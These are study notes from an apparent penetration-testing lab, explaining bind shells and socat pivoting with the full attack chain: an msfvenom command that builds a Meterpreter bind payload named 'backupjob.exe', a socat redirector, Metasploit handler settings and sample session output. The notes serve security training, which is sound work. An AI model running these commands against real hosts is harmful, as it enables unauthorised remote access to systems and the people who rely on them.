# 1. 🧠 What Is a Bind Shell?

A **bind shell** is different from a reverse shell.

### Reverse Shell

In a reverse shell:

```text
Windows Target
      │
      │ Connects OUT
      ▼
Ubuntu Pivot
      │
      ▼
Attack Host
```

The target initiates the connection toward the attacker.

### Bind Shell

In a bind shell:

```text
Windows Target
      │
      │ LISTENS
      ▼
    Port 8443
      ▲
      │
      │ Attacker connects
      │
Ubuntu Pivot
      │
      ▼
Attack Host
```

The **Windows target starts a listener**, and the attacker connects to that listener.

---

# 2. 🔄 Reverse Shell vs Bind Shell

This distinction is extremely important.

|Reverse Shell|Bind Shell|
|---|---|
|Target connects outward|Target listens|
|Attacker receives connection|Attacker connects to target|
|Target needs outbound connectivity|Attacker needs connectivity to target listener|
|Payload uses `reverse_*`|Payload uses `bind_*`|

### Reverse

```text
TARGET ─────────────► ATTACKER
```

### Bind

```text
TARGET ◄───────────── ATTACKER
       connection
```

---

# 3. 🧩 Why Do We Need Socat?

The Windows target is on an internal network:

```text
Windows A
172.16.5.19
```

The attack host is on another network.

The Ubuntu server acts as the pivot:

```text
                    Ubuntu Pivot
                    172.16.5.129
                       /    \
                      /      \
                     /        \
              Attack Host    Windows
                         172.16.5.19
```

The problem is that the attacker needs a way to reach the bind shell on Windows.

Socat becomes the bridge:

```text
Attack Host
     │
     ▼
Ubuntu:8080
     │
     │ Socat
     ▼
Windows:8443
```

---

# 4. 🖼️ Complete Network Diagram

The complete conceptual flow:

```text
                    ATTACK HOST
                    10.10.14.18
                         │
                         │ Connects
                         ▼
                  Ubuntu Pivot
                  172.16.5.129
                     :8080
                         │
                         │ Socat
                         ▼
                  Windows Target
                  172.16.5.19
                     :8443
                         │
                         ▼
                   Bind Shell
```

---

# 5. 🎯 The Main Idea

The Windows payload creates a listener:

```text
Windows:8443
```

Socat listens on:

```text
Ubuntu:8080
```

and forwards:

```text
Ubuntu:8080
       ↓
Windows:8443
```

Metasploit then connects to:

```text
Ubuntu:8080
```

So the final path becomes:

```text
Attack Host
    │
    ▼
Ubuntu:8080
    │
    ▼
Socat
    │
    ▼
Windows:8443
    │
    ▼
Bind Shell
```

---

# 6. 🛠️ Step 1 — Create the Windows Bind Shell Payload

The supplied command is:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

The important configuration is:

```text
Payload:
windows/x64/meterpreter/bind_tcp

LPORT:
8443

Output:
backupjob.exe
```

---

# 7. 🔍 Breaking Down the Payload

### `msfvenom`

Payload-generation tool.

### `-p`

Specifies the payload.

```text
windows/x64/meterpreter/bind_tcp
```

This means:

- Windows
    
- x64 architecture
    
- Meterpreter
    
- TCP bind shell
    

### `LPORT=8443`

The Windows target will listen on:

```text
172.16.5.19:8443
```

### `-f exe`

Creates a Windows executable.

### `-o backupjob.exe`

Output filename.

---

# 8. ⭐ Important Difference From the Previous Section

Previously we used:

```text
windows/x64/meterpreter/reverse_https
```

Now we use:

```text
windows/x64/meterpreter/bind_tcp
```

### Reverse:

```text
Target → Attacker
```

### Bind:

```text
Target listens ← Attacker
```

This one-word difference is conceptually very important:

```text
reverse
   ↓
target CONNECTS

bind
   ↓
target LISTENS
```

---

# 9. 📦 Step 2 — Execute/Transfer the Payload

The supplied material assumes that the payload is transferred to the Windows target using techniques covered previously.

The important result is:

```text
Windows Target
      │
      ▼
backupjob.exe
      │
      ▼
Windows listens on :8443
```

Once the payload executes, the target's bind shell becomes available on:

```text
172.16.5.19:8443
```

---

# 10. 🔊 Step 3 — Start Socat Redirector

On Ubuntu:

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

This is the key Socat command for the bind-shell setup.

---

# 11. 🔍 Breaking Down the Socat Command

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### `TCP4-LISTEN:8080`

Ubuntu listens on:

```text
8080
```

### `fork`

Allows separate handling of incoming connections.

### `TCP4:172.16.5.19:8443`

Socat forwards received traffic to:

```text
172.16.5.19:8443
```

---

# 12. 🧠 Socat's Role

Socat is essentially creating this:

```text
Ubuntu:8080
     │
     │ SOCAT
     ▼
Windows:8443
```

Therefore, the attacker doesn't need to directly connect to:

```text
172.16.5.19:8443
```

Instead, the attacker connects to the pivot:

```text
Ubuntu:8080
```

and Socat redirects the connection.

---

# 13. 📊 Port Mapping

Memorize this table:

|Component|Address|Port|
|---|---|--:|
|Attack Host|`10.10.14.18`|—|
|Ubuntu Socat listener|`172.16.5.129`|**8080**|
|Windows bind shell|`172.16.5.19`|**8443**|

The mapping:

```text
Ubuntu:8080
     ↓
Socat
     ↓
Windows:8443
```

---

# 14. 🔄 Step 4 — Configure Metasploit Bind Handler

Start:

```text
use exploit/multi/handler
```

Then select:

```text
set payload windows/x64/meterpreter/bind_tcp
```

Now configure:

```text
set RHOST 10.129.202.64
```

and:

```text
set LPORT 8080
```

Then:

```text
run
```

The supplied output is:

```text
[*] Started bind TCP handler against 10.129.202.64:8080
```

---

# 15. ⚠️ Important: `RHOST` and `LPORT`

For this particular lab, the supplied Metasploit configuration uses:

```text
RHOST = 10.129.202.64
LPORT = 8080
```

The important conceptual point is that the **bind handler connects to the Socat listener**, which then redirects to the Windows bind shell.

So conceptually:

```text
Metasploit
     │
     │ Connect
     ▼
Ubuntu:8080
     │
     │ Socat
     ▼
Windows:8443
```

---

# 16. 🧠 Why Is This a Bind Shell?

Because the target is the system that listens.

After the payload executes:

```text
Windows
   │
   └── LISTEN :8443
```

The attacker initiates the connection:

```text
Attack Host
    │
    ▼
Ubuntu:8080
    │
    ▼
Windows:8443
```

This is fundamentally different from a reverse shell.

---

# 17. 🆚 Reverse Socat vs Bind Socat

This is one of the most important comparisons from these two sections.

## Socat Reverse Shell

```text
Windows
   │
   │ Connects OUT
   ▼
Ubuntu:8080
   │
   │ Socat
   ▼
Attack Host:80
```

The target initiates the connection.

---

## Socat Bind Shell

```text
Windows:8443
      ▲
      │
    Socat
      ▲
      │
Ubuntu:8080
      ▲
      │
Attack Host
```

The attacker initiates the connection.

---

# 18. 📊 Side-by-Side Comparison

||Reverse Shell|Bind Shell|
|---|---|---|
|Target|Connects|Listens|
|Payload|`reverse_https`|`bind_tcp`|
|Target port|Outbound connection port|Listening port|
|Attacker|Receives connection|Initiates connection|
|Socat|Redirects target's outgoing traffic|Redirects attacker's incoming connection|
|Example target port|`8080`|`8443`|

---

# 19. 🧠 The Direction Is Everything

### Reverse shell:

```text
TARGET
  │
  │ CONNECT
  ▼
PIVOT
  │
  ▼
ATTACKER
```

### Bind shell:

```text
ATTACKER
  │
  │ CONNECT
  ▼
PIVOT
  │
  ▼
TARGET
```

So:

> **Reverse = target reaches out. Bind = attacker reaches in.**

---

# 20. 🔥 Complete Bind-Shell Flow

Let's put everything together:

### Step 1

Create:

```text
windows/x64/meterpreter/bind_tcp
```

with:

```text
LPORT=8443
```

### Step 2

Execute the payload on Windows.

Windows listens:

```text
172.16.5.19:8443
```

### Step 3

Start Socat:

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Step 4

Ubuntu listens:

```text
172.16.5.129:8080
```

### Step 5

Metasploit connects to the Socat listener.

```text
Metasploit
    ↓
Ubuntu:8080
```

### Step 6

Socat forwards the connection:

```text
Ubuntu:8080
    ↓
Socat
    ↓
Windows:8443
```

### Step 7

Meterpreter session is established.

---

# 21. 🖼️ Complete Attack Diagram

```text
                  ATTACK HOST
                  10.10.14.18
                       │
                       │
                       │ CONNECT
                       ▼
                ┌───────────────┐
                │ Ubuntu Pivot  │
                │ 172.16.5.129  │
                │    :8080      │
                └───────┬───────┘
                        │
                     SOCAT
                        │
                        ▼
                ┌───────────────┐
                │ Windows       │
                │ 172.16.5.19   │
                │    :8443      │
                └───────┬───────┘
                        │
                        ▼
                   Bind Shell
                        │
                        ▼
                   Meterpreter
```

---

# 22. 🔍 Understanding the Meterpreter Output

The supplied output shows:

```text
[*] Sending stage (200262 bytes) to 10.129.202.64
```

This indicates that the Meterpreter stage is being sent.

Then:

```text
[*] Meterpreter session 1 opened
```

This confirms successful session establishment.

The supplied session information is:

```text
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

Therefore, the session is running in the context of:

```text
INLANEFREIGHT\victor
```

---

# 23. 🧠 Understanding the Connection Log

The supplied output contains:

```text
10.10.14.18:46253 -> 10.129.202.64:8080
```

Conceptually, this shows:

```text
Source
10.10.14.18:46253
      │
      ▼
Destination
10.129.202.64:8080
```

The connection reaches the Socat listener and is then redirected toward the Windows bind shell.

---

# 24. 🔄 Socat as a Pivot

The Ubuntu machine isn't necessarily running the shell.

Instead:

```text
Ubuntu
   │
   └── Redirector
```

It acts as a middle point:

```text
Attacker
    │
    ▼
Ubuntu
    │
    ▼
Windows
```

This is why Ubuntu is called the **pivot host**.

---

# 25. 🧠 General Pivoting Model

The same concept can be generalized:

```text
Attacker
    │
    ▼
Pivot
    │
    ▼
Internal Target
```

The pivot provides connectivity between two network locations that don't have a convenient direct path.

---

# 26. 🛠️ Important Commands

### Generate bind payload

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

### Start Socat

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Configure Metasploit

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

### Verify identity

```text
meterpreter > getuid
```

---

# 27. 📌 Most Important Configuration

Keep this relationship in your notes:

```text
WINDOWS BIND PAYLOAD
        │
        ├── Payload = windows/x64/meterpreter/bind_tcp
        └── LPORT = 8443

              ↓

SOCAT
        │
        ├── LISTEN = 8080
        └── FORWARD = 172.16.5.19:8443

              ↓

METASPLOIT
        │
        ├── Payload = windows/x64/meterpreter/bind_tcp
        ├── RHOST = 10.129.202.64
        └── LPORT = 8080
```

---

# 28. 🧠 Why Are There Two Different Ports?

This is a common source of confusion.

### `8443`

The **actual Windows bind-shell port**.

```text
Windows
   └── :8443
```

### `8080`

The **Socat-facing port**.

```text
Ubuntu
   └── :8080
```

Therefore:

```text
Attacker
   │
   ▼
Ubuntu:8080
   │
   │ Socat
   ▼
Windows:8443
```

---

# 29. 🧠 Why Doesn't Metasploit Directly Connect to `8443`?

Because the purpose of the pivot is to avoid requiring the attack host to directly reach the internal Windows machine.

Instead:

```text
Attack Host
     │
     X
     │
Windows:8443
```

becomes:

```text
Attack Host
     │
     ▼
Ubuntu:8080
     │
     ▼
Windows:8443
```

The Ubuntu server provides the path.

---

# 30. 🆚 SSH Reverse Forward vs Socat Bind Redirector

You have now seen two related techniques.

### SSH reverse forwarding:

```text
Windows
   │
   ▼
Ubuntu:8080
   │
   │ SSH
   ▼
Attack Host:8000
```

### Socat bind redirector:

```text
Attack Host
   │
   ▼
Ubuntu:8080
   │
   │ Socat
   ▼
Windows:8443
```

The **direction of the connection** is the major difference.

---

# 31. 📚 Three Concepts Together

At this point, you should be able to distinguish:

### Reverse shell

```text
Target ─────► Attacker
```

### Bind shell

```text
Target ◄───── Attacker
```

### Socat redirector

```text
Endpoint A ◄──► Socat ◄──► Endpoint B
```

Combine them appropriately depending on the network topology.

---

# 32. 📝 Viva Questions

### Q1. What is a bind shell?

A shell where the target system listens on a specified port and waits for an incoming connection.

### Q2. How is it different from a reverse shell?

A reverse shell has the target initiate the connection; a bind shell has the target listen while the attacker initiates the connection.

### Q3. What payload is used?

```text
windows/x64/meterpreter/bind_tcp
```

### Q4. What port does the Windows bind shell use?

```text
8443
```

### Q5. What port does Socat listen on?

```text
8080
```

### Q6. Where does Socat forward the connection?

```text
172.16.5.19:8443
```

### Q7. What does `fork` do?

It allows Socat to handle incoming connections independently.

### Q8. What is the purpose of Ubuntu?

It acts as the **pivot/redirector**.

### Q9. Where does the attacker connect?

To the Socat listener on:

```text
Ubuntu:8080
```

### Q10. What does Socat do?

It redirects the attacker's connection from:

```text
Ubuntu:8080
```

to:

```text
Windows:8443
```

### Q11. What command verifies the Meterpreter user's identity?

```text
getuid
```

### Q12. What user is shown in the supplied example?

```text
INLANEFREIGHT\victor
```

---

# 33. ⚡ One-Minute Revision

```text
              BIND SHELL
                  │
                  ▼
        Windows LISTENS :8443
                  ▲
                  │
               SOCAT
                  ▲
                  │
        Ubuntu LISTENS :8080
                  ▲
                  │
               ATTACKER
```

### Payload:

```text
windows/x64/meterpreter/bind_tcp
LPORT=8443
```

### Socat:

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Metasploit:

```text
windows/x64/meterpreter/bind_tcp
RHOST = 10.129.202.64
LPORT = 8080
```

### Final path:

```text
ATTACK HOST
     ↓
Ubuntu:8080
     ↓
SOCAT
     ↓
Windows:8443
     ↓
BIND SHELL
     ↓
METERPRETER
```

---

# 🏆 34. Ultimate Memory Trick

Remember these three:

```text
REVERSE SHELL
Target CONNECTS
        ↓
Target → Attacker
```

```text
BIND SHELL
Target LISTENS
        ↓
Attacker → Target
```

```text
SOCAT
Redirects
        ↓
A → Socat → B
```

So for this exact lab:

> **Windows binds to 8443 → Ubuntu listens on 8080 with Socat → Socat forwards 8080 to Windows 8443 → Metasploit connects to Ubuntu 8080 → Meterpreter session is established.**

```text
Windows :8443
      ▲
      │
      │ Socat forwards
      │
Ubuntu :8080
      ▲
      │
      │ Attacker connects
      │
Metasploit
```